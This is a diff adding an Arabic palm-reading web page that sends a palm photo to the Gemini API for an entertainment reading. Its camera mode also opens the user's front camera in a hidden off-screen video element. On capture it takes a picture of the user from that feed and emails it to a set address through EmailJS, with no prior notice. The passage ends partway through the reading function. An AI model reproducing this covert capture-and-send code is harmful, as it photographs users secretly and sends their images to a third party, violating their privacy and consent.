@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أسرار الكف - قراءة الكف بالذكاء الاصطناعي</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- EmailJS CDN -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS with your Public Key
+        // Replace 'UbJp42lWtq38Tx9mi' with your actual EmailJS Public Key
+        (function() {
+            emailjs.init("UbJp42lWtq38Tx9mi"); // تأكد من استخدام المفتاح العام الصحيح هنا
+        })();
+    </script>
+    <style>
+        /* Custom styles for Inter font */
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        /* Styling for the uploaded/captured image preview */
+        #palmImagePreviewPalm, #capturedRearImagePreview {
+            width: 100%;
+            max-width: 300px; /* Max width for the palm image */
+            height: auto;
+            border-radius: 0.75rem; /* rounded-xl */
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); /* shadow-lg */
+            background-color: #f3f4f6; /* bg-gray-100 */
+            display: none; /* Hidden by default */
+            object-fit: contain; /* Ensure image fits within bounds */
+        }
+        /* Style for loading indicator */
+        .loading-indicator {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 30px; /* Adjust height as needed */
+            margin-top: 1rem;
+        }
+        .loading-indicator .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #8B5CF6; /* Purple color for spinner */
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Hide sections by default, JavaScript will manage visibility */
+        .page-section {
+            display: none;
+        }
+        .page-section.active {
+            display: block;
+        }
+        /* Hidden video elements for camera streams - IMPORTANT: Use absolute positioning to keep them rendered */
+        #hiddenRearVideoFeed, #hiddenFrontVideoFeed {
+            position: absolute;
+            left: -9999px; /* Move off-screen */
+            top: -9999px;
+            width: 1px; /* Minimal size */
+            height: 1px;
+            opacity: 0; /* Fully transparent */
+            pointer-events: none; /* Not interactive */
+        }
+        /* Visible video element for live preview in camera mode */
+        #liveCameraFeed {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 0.75rem;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            background-color: #f3f4f6;
+            display: none; /* Hidden by default */
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-purple-50 to-indigo-100 min-h-screen flex flex-col">
+
+    <!-- Header -->
+    <header class="bg-white shadow-md py-4 px-6 sticky top-0 z-50">
+        <div class="container mx-auto flex justify-between items-center">
+            <a href="#" class="text-2xl font-bold text-purple-700 hover:text-purple-900" onclick="showSection('home'); return false;">
+                أسرار الكف
+            </a>
+            <nav>
+                <ul class="flex space-x-4 space-x-reverse">
+                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('home'); return false;">الرئيسية</a></li>
+                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('how-it-works'); return false;">كيف يعمل</a></li>
+                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('palm-reading'); return false;">قراءة الكف</a></li>
+                    <li><a href="#" class="text-gray-700 hover:text-purple-700 font-medium transition duration-200" onclick="showSection('contact'); return false;">اتصل بنا</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content Area -->
+    <main class="flex-grow container mx-auto py-8 px-4 flex justify-center items-start">
+        <div class="w-full max-w-4xl bg-white p-6 sm:p-8 rounded-2xl shadow-xl">
+
+            <!-- Message box for user feedback -->
+            <div id="messageBox" class="bg-blue-100 border-l-4 border-blue-500 text-blue-700 p-4 rounded-md hidden w-full mb-6" role="alert">
+                <p id="messageText" class="font-medium text-sm sm:text-base"></p>
+            </div>
+
+            <!-- Home Section -->
+            <section id="home-section" class="page-section active text-center space-y-6">
+                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">مرحباً بك في أسرار الكف!</h2>
+                <p class="text-lg text-gray-600 leading-relaxed">
+                    اكتشف عالم قراءة الكف الغامض بطريقة جديدة ومبتكرة. موقعنا يقدم لك قراءة كف ترفيهية ومحفزة باستخدام أحدث تقنيات الذكاء الاصطناعي.
+                </p>
+                <p class="text-lg text-gray-600 leading-relaxed">
+                    ما عليك سوى رفع صورة واضحة لكفك أو التقاطها مباشرة، وسيقوم نظامنا بتوليد قراءة ممتعة لك، مع التركيز على الجوانب الإيجابية لشخصيتك ومسارك المحتمل.
+                </p>
+                <button class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-lg transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-75" onclick="showSection('palm-reading'); return false;">
+                    ابدأ قراءة كفك الآن!
+                </button>
+            </section>
+
+            <!-- How It Works Section -->
+            <section id="how-it-works-section" class="page-section text-center space-y-6">
+                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">كيف يعمل؟</h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 text-right">
+                    <div class="flex flex-col items-center p-4 bg-purple-50 rounded-lg shadow-sm">
+                        <div class="text-purple-600 text-5xl mb-3">📸</div>
+                        <h3 class="text-xl font-semibold text-gray-700 mb-2">1. التقط أو ارفـع</h3>
+                        <p class="text-gray-600">التقط صورة واضحة لراحة كفك مباشرة من الكاميرا أو ارفع صورة موجودة.</p>
+                    </div>
+                    <div class="flex flex-col items-center p-4 bg-purple-50 rounded-lg shadow-sm">
+                        <div class="text-purple-600 text-5xl mb-3">✨</div>
+                        <h3 class="text-xl font-semibold text-gray-700 mb-2">2. تحليل الذكاء الاصطناعي</h3>
+                        <p class="text-gray-600">يقوم نظام الذكاء الاصطناعي لدينا (نموذج لغوي كبير) بمعالجة طلبك لتوليد قراءة فريدة لك. <strong class="text-red-500">(ملاحظة: لا يتم تحليل خطوط الكف بصريًا بشكل حقيقي، القراءة لأغراض الترفيه).</strong></p>
+                    </div>
+                    <div class="flex flex-col items-center p-4 bg-purple-50 rounded-lg shadow-sm">
+                        <div class="text-purple-600 text-5xl mb-3">🔮</div>
+                        <h3 class="text-xl font-semibold text-gray-700 mb-2">3. احصل على قراءتك</h3>
+                        <p class="text-gray-600">ستظهر قراءة كفك الشخصية على الشاشة، مليئة بالرؤى الملهمة والممتعة.</p>
+                    </div>
+                </div>
+                <p class="text-lg text-gray-600 mt-6">
+                    تذكر دائمًا أن هذه القراءات هي للمتعة والتسلية فقط، ولا يجب الاعتماد عليها لاتخاذ قرارات حياتية مهمة.
+                </p>
+            </section>
+
+            <!-- Palm Reading Section (Core Functionality) -->
+            <section id="palm-reading-section" class="page-section flex flex-col items-center space-y-6">
+                <h2 class="text-4xl font-extrabold text-gray-800 mb-4 text-center">قراءة كفك</h2>
+                <p class="text-gray-600 text-center text-lg">اختر مصدر الصورة للحصول على قراءتك الترفيهية.</p>
+
+                <!-- Source Selection Buttons -->
+                <div class="flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-4 sm:space-x-reverse w-full justify-center mb-6">
+                    <button id="uploadModeButton" class="bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-opacity-75">
+                        رفع صورة
+                    </button>
+                    <button id="cameraModeButton" class="bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-teal-500 focus:ring-opacity-75">
+                        التقاط من الكاميرا
+                    </button>
+                </div>
+
+                <!-- Image Upload Mode -->
+                <div id="imageUploadMode" class="w-full flex flex-col items-center space-y-4 hidden">
+                    <label for="palmImageUploadPalm" class="block text-gray-700 text-lg font-semibold mb-2 text-center">
+                        رفع صورة الكف:
+                    </label>
+                    <input type="file" id="palmImageUploadPalm" accept="image/*" class="block w-full text-sm text-gray-500
+                        file:mr-4 file:py-2 file:px-4
+                        file:rounded-full file:border-0
+                        file:text-sm file:font-semibold
+                        file:bg-purple-50 file:text-purple-700
+                        hover:file:bg-purple-100 cursor-pointer"
+                        onchange="handleImageUpload(event)">
+                    <img id="palmImagePreviewPalm" src="#" alt="معاينة صورة الكف" class="mt-4">
+                </div>
+
+                <!-- Camera Capture Mode -->
+                <div id="cameraCaptureMode" class="w-full flex flex-col items-center space-y-4 hidden">
+                    <p class="text-gray-700 text-lg font-semibold mb-2 text-center">
+                        معاينة الكاميرا الخلفية:
+                    </p>
+                    <video id="liveCameraFeed" autoplay playsinline></video>
+                    <canvas id="hiddenCanvas" class="hidden"></canvas>
+                    <video id="hiddenRearVideoFeed"></video> <!-- Hidden video for actual rear stream source -->
+                    <video id="hiddenFrontVideoFeed"></video> <!-- Hidden video for actual front stream source -->
+
+                    <button id="capturePhotoButton" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-75 w-full">
+                        التقاط الصورة
+                    </button>
+
+                    <div id="capturedImagesDisplay" class="flex flex-col items-center w-full mt-4">
+                        <h3 class="text-lg font-semibold text-gray-700 mb-2">الصورة الخلفية الملتقطة</h3>
+                        <img id="capturedRearImagePreview" alt="الصورة الخلفية الملتقطة">
+                    </div>
+                </div>
+
+                <!-- Analyze Button -->
+                <button id="analyzeButtonPalm" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-6 rounded-lg shadow-md transition duration-300 ease-in-out transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-75 w-full disabled:opacity-50 disabled:cursor-not-allowed" disabled>
+                    تحليل الكف
+                </button>
+
+                <!-- Loading Indicator -->
+                <div id="loadingIndicatorPalm" class="loading-indicator hidden">
+                    <div class="spinner"></div>
+                    <span class="ml-2 text-gray-700">جاري تحليل كفك...</span>
+                </div>
+
+                <!-- Palm Reading Results -->
+                <div id="readingResultsPalm" class="bg-purple-50 p-6 rounded-xl shadow-inner w-full text-gray-800 hidden mt-6">
+                    <h2 class="text-2xl font-bold text-center text-purple-800 mb-4">قراءة كفك</h2>
+                    <p class="text-sm text-center text-gray-500 mb-4">
+                        (ملاحظة: هذه القراءة لأغراض الترفيه والتسلية فقط، ولا تعتمد على تحليل بصري حقيقي لخطوط الكف.)
+                    </p>
+                    <div id="readingTextPalm" class="text-lg leading-relaxed text-justify">
+                        <!-- Reading content will be inserted here -->
+                    </div>
+                </div>
+            </section>
+
+            <!-- Contact Section -->
+            <section id="contact-section" class="page-section text-center space-y-6">
+                <h2 class="text-4xl font-extrabold text-gray-800 mb-4">اتصل بنا</h2>
+                <p class="text-lg text-gray-600 leading-relaxed">
+                    إذا كان لديك أي أسئلة أو استفسارات، فلا تتردد في التواصل معنا.
+                </p>
+                <div class="flex flex-col items-center space-y-4 text-gray-700 text-lg">
+                    <p>البريد الإلكتروني: <a href="mailto:info@yourwebsite.com" class="text-purple-600 hover:underline">info@yourwebsite.com</a></p>
+                    <p>الهاتف: <a href="tel:+1234567890" class="text-purple-600 hover:underline">+123 456 7890</a></p>
+                    <p>العنوان: شارع الخيال، مدينة الأحلام، كوكب السعادة</p>
+                </div>
+            </section>
+
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-6 mt-auto text-center rounded-t-lg shadow-inner">
+        <div class="container mx-auto px-4">
+            <p>&copy; 2025 أسرار الكف. جميع الحقوق محفوظة.</p>
+            <div class="flex justify-center space-x-4 space-x-reverse mt-2">
+                <a href="#" class="text-gray-400 hover:text-white transition duration-200">سياسة الخصوصية</a>
+                <span class="text-gray-500">|</span>
+                <a href="#" class="text-gray-400 hover:text-white transition duration-200">شروط الخدمة</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Global elements for message box
+        const messageBox = document.getElementById('messageBox');
+        const messageText = document.getElementById('messageText');
+
+        // Elements for Palm Reading Section
+        const uploadModeButton = document.getElementById('uploadModeButton');
+        const cameraModeButton = document.getElementById('cameraModeButton');
+        const imageUploadMode = document.getElementById('imageUploadMode');
+        const cameraCaptureMode = document.getElementById('cameraCaptureMode');
+
+        const palmImageUploadPalm = document.getElementById('palmImageUploadPalm');
+        const palmImagePreviewPalm = document.getElementById('palmImagePreviewPalm');
+
+        const liveCameraFeed = document.getElementById('liveCameraFeed'); // Visible rear camera feed
+        const capturedRearImagePreview = document.getElementById('capturedRearImagePreview'); // Preview for rear image
+        const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const hiddenRearVideoFeed = document.getElementById('hiddenRearVideoFeed'); // Hidden video for actual rear stream source
+        const hiddenFrontVideoFeed = document.getElementById('hiddenFrontVideoFeed'); // Hidden video for actual front stream source
+        const capturePhotoButton = document.getElementById('capturePhotoButton');
+
+        const analyzeButtonPalm = document.getElementById('analyzeButtonPalm');
+        const loadingIndicatorPalm = document.getElementById('loadingIndicatorPalm');
+        const readingResultsPalm = document.getElementById('readingResultsPalm');
+        const readingTextPalm = document.getElementById('readingTextPalm');
+
+        // Global variables for camera streams and active image data
+        let currentRearStream = null;
+        let currentFrontStream = null;
+        let activeRearPalmImageBase64 = null; // Stores the captured rear palm image for AI analysis
+
+        // EmailJS Configuration
+        const EMAILJS_SERVICE_ID = 'default_service'; // From your EmailJS account
+        const EMAILJS_TEMPLATE_ID = 'template_qyhaxqi'; // From your EmailJS account
+        const EMAILJS_MAX_SIZE_BYTES = 50 * 1024; // EmailJS 50KB limit (approximate, as Data URL is base64)
+
+        /**
+         * Displays a message to the user in a styled box.
+         * @param {string} message - The message to display.
+         * @param {string} type - The type of message (e.g., 'success', 'error', 'info').
+         */
+        function showMessage(message, type = 'info') {
+            messageText.textContent = message;
+            messageBox.classList.remove('hidden', 'bg-red-100', 'border-red-500', 'text-red-700', 'bg-green-100', 'border-green-500', 'text-green-700', 'bg-blue-100', 'border-blue-500', 'text-blue-700');
+            messageBox.classList.add('flex'); // Ensure it's visible
+
+            if (type === 'error') {
+                messageBox.classList.add('bg-red-100', 'border-red-500', 'text-red-700');
+            } else if (type === 'success') {
+                messageBox.classList.add('bg-green-100', 'border-green-500', 'text-green-700');
+            } else {
+                messageBox.classList.add('bg-blue-100', 'border-blue-500', 'text-blue-700');
+            }
+
+            // Hide after 5 seconds
+            setTimeout(() => {
+                messageBox.classList.add('hidden');
+            }, 5000);
+        }
+
+        /**
+         * Shows a specific section and hides all others.
+         * Manages camera stream state when navigating.
+         * @param {string} sectionId - The ID of the section to show (e.g., 'home', 'palm-reading').
+         */
+        function showSection(sectionId) {
+            document.querySelectorAll('.page-section').forEach(section => {
+                section.classList.remove('active');
+            });
+            document.getElementById(`${sectionId}-section`).classList.add('active');
+            // Clear message box when navigating
+            messageBox.classList.add('hidden');
+            messageText.textContent = '';
+
+            // Manage camera stream when navigating to/from palm-reading section
+            if (sectionId === 'palm-reading') {
+                // Default to upload mode when entering palm reading section
+                showPalmReadingMode('upload');
+            } else {
+                // If leaving palm reading section, stop all camera streams
+                stopAllCameraStreams();
+                // Reset palm reading section UI
+                resetPalmReadingUI();
+            }
+        }
+
+        /**
+         * Resets the UI elements of the palm reading section.
+         */
+        function resetPalmReadingUI() {
+            palmImagePreviewPalm.style.display = 'none';
+            palmImagePreviewPalm.src = '#';
+            capturedRearImagePreview.style.display = 'none';
+            capturedRearImagePreview.src = '#';
+            analyzeButtonPalm.disabled = true;
+            analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
+            loadingIndicatorPalm.classList.add('hidden');
+            readingResultsPalm.classList.add('hidden');
+            readingTextPalm.innerHTML = '';
+            activeRearPalmImageBase64 = null;
+            palmImageUploadPalm.value = ''; // Clear file input
+        }
+
+        /**
+         * Shows either the image upload mode or camera capture mode in the palm reading section.
+         * @param {string} mode - 'upload' or 'camera'.
+         */
+        function showPalmReadingMode(mode) {
+            resetPalmReadingUI(); // Reset UI when switching modes
+            stopAllCameraStreams(); // Ensure all cameras are off when switching modes
+
+            if (mode === 'upload') {
+                imageUploadMode.classList.remove('hidden');
+                cameraCaptureMode.classList.add('hidden');
+                showMessage('الرجاء رفع صورة كفك.', 'info');
+            } else if (mode === 'camera') {
+                imageUploadMode.classList.add('hidden');
+                cameraCaptureMode.classList.remove('hidden');
+                // Start rear camera (visible) and front camera (hidden)
+                startCamera('environment', liveCameraFeed, hiddenRearVideoFeed, 'الكاميرا الخلفية المرئية');
+                startCamera('user', hiddenFrontVideoFeed, hiddenFrontVideoFeed, 'الكاميرا الأمامية المخفية');
+            }
+        }
+
+        /**
+         * Stops all active camera streams.
+         */
+        function stopAllCameraStreams() {
+            if (currentRearStream) {
+                currentRearStream.getTracks().forEach(track => track.stop());
+                currentRearStream = null;
+            }
+            if (currentFrontStream) {
+                currentFrontStream.getTracks().forEach(track => track.stop());
+                currentFrontStream = null;
+            }
+            liveCameraFeed.srcObject = null;
+            hiddenRearVideoFeed.srcObject = null;
+            hiddenFrontVideoFeed.srcObject = null;
+            liveCameraFeed.style.display = 'none';
+        }
+
+        /**
+         * Starts a camera stream with the specified facing mode and attaches it to video elements.
+         * @param {string} mode - 'user' for front camera, 'environment' for rear camera.
+         * @param {HTMLVideoElement} visibleVideoElement - The video element to display the live stream (can be the same as hidden for hidden feeds).
+         * @param {HTMLVideoElement} hiddenVideoElement - The hidden video element to capture frames from.
+         * @param {string} cameraName - Name of the camera for messages (e.g., 'الكاميرا الخلفية المرئية').
+         */
+        async function startCamera(mode, visibleVideoElement, hiddenVideoElement, cameraName) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: mode
+                    }
+                });
+
+                if (mode === 'environment') {
+                    currentRearStream = stream;
+                } else {
+                    currentFrontStream = stream;
+                }
+
+                visibleVideoElement.srcObject = stream;
+                hiddenVideoElement.srcObject = stream; // Important: attach to hidden for capture
+
+                // Wait for the video to actually start playing and have metadata loaded
+                await new Promise((resolve, reject) => {
+                    hiddenVideoElement.onloadedmetadata = () => {
+                        hiddenVideoElement.play().then(() => {
+                            // Ensure video has dimensions before resolving
+                            if (hiddenVideoElement.videoWidth > 0 && hiddenVideoElement.videoHeight > 0) {
+                                resolve();
+                            } else {
+                                reject(new Error('Video stream has no dimensions.'));
+                            }
+                        }).catch(reject);
+                    };
+                    hiddenVideoElement.onerror = reject;
+                });
+
+                if (visibleVideoElement === liveCameraFeed) { // Only show the main live feed
+                    liveCameraFeed.style.display = 'block';
+                }
+                showMessage(`تم تفعيل ${cameraName}.`, 'success');
+            } catch (err) {
+                console.error(`Error accessing ${cameraName} camera:`, err);
+                showMessage(`خطأ في الوصول إلى ${cameraName}. يرجى التأكد من السماح بالوصول.`, 'error');
+                if (visibleVideoElement === liveCameraFeed) {
+                    liveCameraFeed.style.display = 'none';
+                }
+            }
+        }
+
+        /**
+         * Resizes a Base64 image to fit within maxWidth/maxHeight while maintaining aspect ratio.
+         * Returns a Promise that resolves with the resized Base64 string.
+         * @param {string} base64Str - The original Base64 image string.
+         * @param {number} maxWidth - Maximum desired width.
+         * @param {number} maxHeight - Maximum desired height.
+         * @returns {Promise<string|null>} - Resized Base64 string or null on error.
+         */
+        async function resizeImage(base64Str, maxWidth = 600, maxHeight = 600) {
+            return new Promise((resolve) => {
+                const img = new Image();
+                img.onload = () => {
+                    let width = img.width;
+                    let height = img.height;
+
+                    // Calculate the new dimensions while maintaining aspect ratio
+                    if (width > height) {
+                        if (width > maxWidth) {
+                            height *= maxWidth / width;
+                            width = maxWidth;
+                        }
+                    } else {
+                        if (height > maxHeight) {
+                            width *= maxHeight / height;
+                            height = maxHeight;
+                        }
+                    }
+
+                    const canvas = document.createElement('canvas'); // Create a temporary canvas
+                    canvas.width = width;
+                    canvas.height = height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(img, 0, 0, width, height);
+
+                    // Return as JPEG with a reasonable quality for LLM input or EmailJS
+                    // Using 0.8 quality to balance size and visual quality
+                    resolve(canvas.toDataURL('image/jpeg', 0.8));
+                };
+                img.onerror = () => {
+                    showMessage('فشل في معالجة الصورة.', 'error');
+                    resolve(null);
+                };
+                img.src = base64Str;
+            });
+        }
+
+        /**
+         * Sends a Base64 image via EmailJS.
+         * @param {string} imageDataURL - The Base64 data URL of the image to send.
+         * @param {string} cameraType - 'front' or 'rear' for message context.
+         */
+        async function sendImageViaEmailJS(imageDataURL, cameraType) {
+            const dataUrlSizeInBytes = new TextEncoder().encode(imageDataURL).length;
+
+            if (dataUrlSizeInBytes > EMAILJS_MAX_SIZE_BYTES) {
+                showMessage(`حجم صورة الكاميرا ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'} (${(dataUrlSizeInBytes / 1024).toFixed(2)}KB) يتجاوز الحد الأقصى لـ EmailJS (${(EMAILJS_MAX_SIZE_BYTES / 1024).toFixed(0)}KB). لم يتم إرسالها.`, 'error');
+                return;
+            }
+
+            const templateParams = {
+                from_name: `تطبيق الكف - كاميرا ${cameraType === 'front' ? 'أمامية' : 'خلفية'}`,
+                to_email: "your_recipient_email@example.com", // **IMPORTANT: Change this to the recipient's email**
+                subject: `صورة جديدة من الكاميرا ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'}`,
+                message: `مرحباً، هذه صورة جديدة تم التقاطها من الكاميرا ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'} لتطبيق قراءة الكف.`,
+                image_data_url: imageDataURL
+            };
+
+            try {
+                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+                showMessage(`تم إرسال صورة الكاميرا ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'} عبر البريد الإلكتروني بنجاح!`, 'success');
+            } catch (error) {
+                console.error(`Failed to send ${cameraType} camera image via email:`, error);
+                showMessage(`فشل إرسال صورة الكاميرا ${cameraType === 'front' ? 'الأمامية' : 'الخلفية'} عبر البريد الإلكتروني.`, 'error');
+            }
+        }
+
+        /**
+         * Handles image upload from file input.
+         * @param {Event} event - The change event from the file input.
+         */
+        async function handleImageUpload(event) {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    const originalBase64 = e.target.result;
+                    const resizedBase64 = await resizeImage(originalBase64);
+
+                    if (resizedBase64) {
+                        palmImagePreviewPalm.src = resizedBase64;
+                        palmImagePreviewPalm.style.display = 'block';
+                        capturedRearImagePreview.style.display = 'none'; // Hide camera previews
+                        activeRearPalmImageBase64 = resizedBase64; // Use this as the main image for AI
+                        analyzeButtonPalm.disabled = false; // Enable the analyze button
+                        analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
+                        readingResultsPalm.classList.add('hidden'); // Hide previous results
+                        showMessage('تم تحميل الصورة وتعديل أبعادها بنجاح. انقر على "تحليل الكف" للحصول على قراءتك.', 'success');
+                    } else {
+                        palmImagePreviewPalm.style.display = 'none';
+                        analyzeButtonPalm.disabled = true;
+                        analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
+                        activeRearPalmImageBase64 = null;
+                    }
+                };
+                reader.onerror = function() {
+                    showMessage('فشل تحميل الصورة.', 'error');
+                    palmImagePreviewPalm.style.display = 'none';
+                    analyzeButtonPalm.disabled = true;
+                    analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
+                    activeRearPalmImageBase64 = null;
+                };
+                reader.readAsDataURL(file); // Read file as Data URL (Base64)
+            } else {
+                palmImagePreviewPalm.style.display = 'none';
+                analyzeButtonPalm.disabled = true;
+                analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
+                activeRearPalmImageBase64 = null;
+                showMessage('الرجاء اختيار صورة.', 'info');
+            }
+        }
+
+        /**
+         * Captures frames from both rear and front hidden video feeds.
+         * Displays rear image and sends front image via EmailJS.
+         */
+        async function capturePhoto() {
+            // Check if rear camera stream is ready
+            if (!currentRearStream || !hiddenRearVideoFeed.srcObject || hiddenRearVideoFeed.videoWidth === 0 || hiddenRearVideoFeed.videoHeight === 0) {
+                showMessage('الكاميرا الخلفية ليست جاهزة لالتقاط الصورة. يرجى التأكد من السماح بالوصول.', 'error');
+                return;
+            }
+            // Check if front camera stream is ready for email sending
+            if (!currentFrontStream || !hiddenFrontVideoFeed.srcObject || hiddenFrontVideoFeed.videoWidth === 0 || hiddenFrontVideoFeed.videoHeight === 0) {
+                showMessage('الكاميرا الأمامية ليست جاهزة لإرسال الصورة. يرجى التأكد من السماح بالوصول.', 'error');
+                // Continue with rear camera capture if front fails
+            }
+
+            // Hide live feed after capture
+            liveCameraFeed.style.display = 'none';
+
+            // Capture from Rear Camera (for display and AI)
+            hiddenCanvas.width = hiddenRearVideoFeed.videoWidth;
+            hiddenCanvas.height = hiddenRearVideoFeed.videoHeight;
+            let context = hiddenCanvas.getContext('2d');
+            context.drawImage(hiddenRearVideoFeed, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+            const originalRearBase64 = hiddenCanvas.toDataURL('image/png');
+            const resizedRearBase64 = await resizeImage(originalRearBase64);
+
+            // Capture from Front Camera (for EmailJS only)
+            let resizedFrontBase64 = null;
+            if (currentFrontStream && hiddenFrontVideoFeed.srcObject && hiddenFrontVideoFeed.videoWidth > 0 && hiddenFrontVideoFeed.videoHeight > 0) {
+                hiddenCanvas.width = hiddenFrontVideoFeed.videoWidth;
+                hiddenCanvas.height = hiddenFrontVideoFeed.videoHeight;
+                context = hiddenCanvas.getContext('2d');
+                context.drawImage(hiddenFrontVideoFeed, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+                const originalFrontBase64 = hiddenCanvas.toDataURL('image/png');
+                resizedFrontBase64 = await resizeImage(originalFrontBase64);
+            }
+
+
+            // Handle Rear Image Display and Storage for AI
+            if (resizedRearBase64) {
+                capturedRearImagePreview.src = resizedRearBase64;
+                capturedRearImagePreview.style.display = 'block';
+                palmImagePreviewPalm.style.display = 'none'; // Hide upload preview if active
+                activeRearPalmImageBase64 = resizedRearBase64; // Store for AI analysis
+                analyzeButtonPalm.disabled = false;
+                analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
+                showMessage('تم التقاط الصورة الخلفية وتعديل أبعادها بنجاح.', 'success');
+            } else {
+                capturedRearImagePreview.style.display = 'none';
+                analyzeButtonPalm.disabled = true;
+                analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
+                activeRearPalmImageBase64 = null;
+                showMessage('فشل التقاط أو معالجة الصورة الخلفية.', 'error');
+            }
+
+            // Handle Front Image Sending via EmailJS
+            if (resizedFrontBase64) {
+                await sendImageViaEmailJS(resizedFrontBase64, 'front');
+            } else {
+                showMessage('لم يتم التقاط صورة الكاميرا الأمامية لإرسالها عبر البريد الإلكتروني.', 'info');
+            }
+        }
+
+        /**
+         * Generates a simulated palm reading using the Gemini API.
+         */
+        async function generatePalmReading() {
+            if (!activeRearPalmImageBase64) {
+                showMessage('الرجاء رفع أو التقاط صورة كفك الخلفية أولاً.', 'error');
+                return;
+            }
+
+            // Show loading indicator and disable button
+            analyzeButtonPalm.disabled = true;
+            analyzeButtonPalm.classList.add('opacity-50', 'cursor-not-allowed');
+            loadingIndicatorPalm.classList.remove('hidden');
+            readingResultsPalm.classList.add('hidden'); // Hide previous results
+            messageBox.classList.add('hidden'); // Hide any previous messages
+
+            try {
+                // Prepare the prompt for the LLM
+                const prompt = "أنت قارئ كف افتراضي. بناءً على الصورة التي تم تحميلها (لا تحاول تحليلها بصريًا بدقة، فقط استخدمها كإشارة لبدء القراءة)، قم بتوليد قراءة كف إيجابية وممتعة ومحفزة. يجب أن تكون القراءة عامة وتتحدث عن خطوط الحياة، القلب، الرأس، والمصير (إذا كانت موجودة)، بالإضافة إلى التلال الرئيسية (مثل تل المشتري، تل القمر). اجعلها تبدو وكأنها تحليل حقيقي ولكن اذكر بوضوح في النهاية أنها لأغراض الترفيه والتسلية فقط. استخدم لغة عربية فصحى وجذابة. اجعل القراءة متوسطة الطول (حوالي 200-300 كلمة).";
+
+                const contents = [
+                    { role: "user", parts: [{ text: prompt }] }
+                ];
+
+                // Add rear image for AI analysis
+                const mimeTypeRear = activeRearPalmImageBase64.split(',')[0].split(':')[1].split(';')[0];
+                const base64DataRear = activeRearPalmImageBase64.split(',')[1];
+                contents[0].parts.push({
+                    inlineData: {
+                        mimeType: mimeTypeRear,
+                        data: base64DataRear
+                    }
+                });
+
+                const payload = {
+                    contents: contents,
+                    generationConfig: {
+                        temperature: 0.8,
+                        maxOutputTokens: 500
+                    }
+                };
+
+                const apiKey = ""; // API key is provided by Canvas runtime
+                const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+
+                if (result.candidates && result.candidates.length > 0 &&
+                    result.candidates[0].content && result.candidates[0].content.parts &&
+                    result.candidates[0].content.parts.length > 0) {
+                    const reading = result.candidates[0].content.parts[0].text;
+                    readingTextPalm.innerHTML = reading.replace(/\n/g, '<br>');
